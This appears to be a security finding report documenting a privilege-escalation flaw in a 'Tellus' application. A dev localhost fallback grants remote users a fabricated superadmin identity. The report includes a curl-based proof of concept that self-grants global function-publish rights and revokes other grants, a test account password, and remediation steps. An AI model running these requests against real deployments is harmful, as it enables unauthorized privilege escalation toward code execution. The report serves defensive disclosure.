# BFLA: zero-role remote users manage superadmin function-publish grants and self-escalate to function-publish code execution (CODE_REPOS_TEST_AUTH dev fallback reachable behind proxy)

**ID:** vuln-0024
**Severity:** HIGH
**Found:** 2026-08-18 06:43:55 UTC
**Target:** http://host.docker.internal:3000
**Endpoint:** /api/v1/functions/admin/function-publish-grants
**Method:** POST
**CWE:** CWE-269
**CVSS:** 8.8
**Fix Effort:** Low

## Description

The function-publish admin surface (`/api/v1/functions/admin/*`) is protected by `requireSuperadmin`, but the upstream authentication middleware fabricates a superadmin principal for any request that appears to come from localhost. Because the deployment sits behind a gateway/proxy, `req.socket.remoteAddress` is loopback for all callers, so any authenticated remote user — even one with zero platform roles — can list, create, and revoke function-publish grants. A zero-role user can therefore grant itself a global function-publish grant and reach arbitrary TypeScript function-publish code execution (Broken Function-Level Authorization → privilege escalation → RCE).

## Evidence

## Impact

Any holder of a valid JWT for any user can manage superadmin-only publish grants: list all grants and the publish audit log, create arbitrary grants, and revoke other principals' grants. By creating a `global` grant bound to its own `keycloak_sub`, a zero-role user satisfies `authorizePublish()` in `services/functions/executionPolicy.ts` (~lines 368-374) and can then publish and execute arbitrary TypeScript functions through the worker_threads+vm executor pool (`src/services/functionExecutor.ts`, documented as not a security boundary). This is a full self-driven privilege escalation from a plain authenticated user to remote code execution, plus the ability to disrupt others by revoking their grants (Availability). Confirmed up to an active global grant; the publish step itself was not executed.

## Technical Analysis

Mount chain: `server.ts:1044` mounts `app.use("/api/v1/functions/admin", createFunctionPublishAdminRouter({ pool }))`; the router applies `router.use(requireCodeReposAuth())` at `services/functions/admin/routes.ts:194`, and each handler (`routes.ts:81-92`, the GET list at `routes.ts:431-434`, plus `:209`/`:565`) correctly calls `requireSuperadmin(req, res)`. The authorization check itself is present — the failure is in the principal that reaches it.

`src/services/codeRepos/middleware/principal.ts` `requireCodeReposAuth()`: when `isTestAuthBypassEnabled("CODE_REPOS_TEST_AUTH")` is true and NO `X-Tellus-Test-Principal` header is present, it falls to the "localhost dev fallback" (lines ~166-191). `isLocalhost(req)` (line ~69) checks only `req.socket.remoteAddress ∈ {127.0.0.1, ::1, ::ffff:127.0.0.1}`. Behind the deployment's gateway/proxy, the app sees a loopback-ish peer for every caller, so remote users satisfy it and are handed `DEV_FALLBACK_PRINCIPAL = "53cf9bcf-4c20-4aed-83f4-3c7e405453b4/OWNER,EDITOR,READER,tellus-superadmin"` (lines 80-81) — the admin's real Keycloak `sub` plus `tellus-superadmin` — without presenting any credential beyond an arbitrary valid Keycloak JWT. `requireSuperadmin` then sees `tellus-superadmin` and passes.

Config: `.env:137` sets `CODE_REPOS_TEST_AUTH=1`; `docker-compose.override.yml:33` defaults it to 0 but `.env` is the loaded value; `utils/testAuthGate.ts` only fails closed when `NODE_ENV==="production"`, and the running app has `NODE_ENV=development`. The whole bypass chain is therefore ACTIVE in this deployment and in any environment with `CODE_REPOS_TEST_AUTH=1` + non-production `NODE_ENV` + a localhost-appearing proxy.

Attacker verified: `cypress-nogroups@tellus.local` (`sub bcd2551e-b985-4d6f-97ff-e0e087a87e20`, realm roles only `offline_access` + `default-roles-tellus`, zero platform roles), no `X-Tellus-Test-Principal` header sent. Contrast: repeating the request with a crafted `X-Tellus-Test-Principal` carrying `roles:[]` returns HTTP 403 `Functions:PermissionDenied superadmin-required` — proving `requireSuperadmin` works and that the bypass comes from the fabricated-principal fallback, not a missing check.

## Proof of Concept

1. Mint a bearer token for the zero-role attacker (`cypress-nogroups@tellus.local`) from Keycloak (realm `tellus`, client `tellus-frontend`). Send no `X-Tellus-Test-Principal` header.
2. `GET /api/v1/functions/admin/function-publish-grants` → HTTP 200 returning the full grant list (a superadmin-only endpoint per the code). `GET .../function-publish-audit-log` → HTTP 200 with publish events.
3. `POST /api/v1/functions/admin/function-publish-grants` with body `{"subjectType":"keycloak_sub","subjectId":"<attacker_sub>","scopeType":"global","reason":"idor-agent-privesc-test"}` → HTTP 201; the created grant is `status: active` and `grantedBy` shows the fabricated principal `53cf9bcf-4c20-4aed-83f4-3c7e405453b4`.
4. `GET /api/v1/functions/admin/function-publish-grants` again → confirms the attacker-bound global grant is now active (this is the row `authorizePublish()` matches to permit publish → code execution).
5. `DELETE /api/v1/functions/admin/function-publish-grants/{existing_grant_id}` → HTTP 200, revoking another principal's grant (re-created afterwards to leave the environment clean).
6. Contrast: repeat step 3 with a crafted `X-Tellus-Test-Principal` header carrying empty roles → HTTP 403 `Functions:PermissionDenied superadmin-required`, proving the check works and the bypass is the dev fallback.

```bash

  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'grant_type=password' \
  -d 'client_id=tellus-frontend' \
  -d 'username=cypress-nogroups@tellus.local' \
  -d 'password=Password123!' | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')

SUB=bcd2551e-b985-4d6f-97ff-e0e087a87e20   # attacker's own keycloak sub

# 2. List superadmin-only publish grants - HTTP 200

# {"grants":[ ... ]}   (also /function-publish-audit-log -> 200)

# 3. Self-grant a GLOBAL function-publish grant - HTTP 201
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "{\"subjectType\":\"keycloak_sub\",\"subjectId\":\"$SUB\",\"scopeType\":\"global\",\"reason\":\"idor-agent-privesc-test\"}" \
  $BASE/api/v1/functions/admin/function-publish-grants
# HTTP 201
# {"id":"55c5ebe7-3115-4c5f-af76-6c21cac20773","subjectType":"keycloak_sub",
#  "subjectId":"bcd2551e-...","scopeType":"global","status":"active",
#  "grantedBy":"53cf9bcf-4c20-4aed-83f4-3c7e405453b4", ...}

# 4. Confirm the active global grant is present - HTTP 200
curl -s -H "Authorization: Bearer $TOKEN" $BASE/api/v1/functions/admin/function-publish-grants
# ... includes the attacker-bound active global grant ...

# 5. Revoke another principal's grant - HTTP 200
curl -s -X DELETE -H "Authorization: Bearer $TOKEN" \
  $BASE/api/v1/functions/admin/function-publish-grants/0267f04d-54e6-42f1-a70d-4b8c70b11e1d

# 6. Contrast: same request WITH empty-roles test principal header - HTTP 403

  -H 'X-Tellus-Test-Principal: bcd2551e-b985-4d6f-97ff-e0e087a87e20/' \
  -d "{\"subjectType\":\"keycloak_sub\",\"subjectId\":\"$SUB\",\"scopeType\":\"global\",\"reason\":\"x\"}" \
```

## Remediation

1. Remove `DEV_FALLBACK_PRINCIPAL` entirely — never fabricate a superadmin principal.
2. When the test-auth flag is on and no `X-Tellus-Test-Principal` header is present, reject with 401 instead of falling back to a privileged identity.
3. Strengthen `isLocalhost`: additionally require `X-Forwarded-For` to be absent or loopback and require `NODE_ENV==="development"` explicitly; never honor the fallback for a request that presents a real JWT for a different user.
4. Add boot-time fail-fast when `CODE_REPOS_TEST_AUTH=1` and the app listens on a non-loopback interface or sits behind a proxy (detect via an env such as `TELLUS_BEHIND_PROXY`).
5. Add a regression test asserting that a remote zero-role JWT with no test headers receives 403 on all `/api/v1/functions/admin/*` methods.

## Assumptions

`CODE_REPOS_TEST_AUTH=1` (present in `.env:137`) and `NODE_ENV != production`; the deployment proxies to the app so `req.socket.remoteAddress` is loopback. The publish-to-RCE hop relies on `authorizePublish` honoring the granted row (code-verified at `src/services/functions/executionPolicy.ts:368-374`); the publish step itself was not executed.
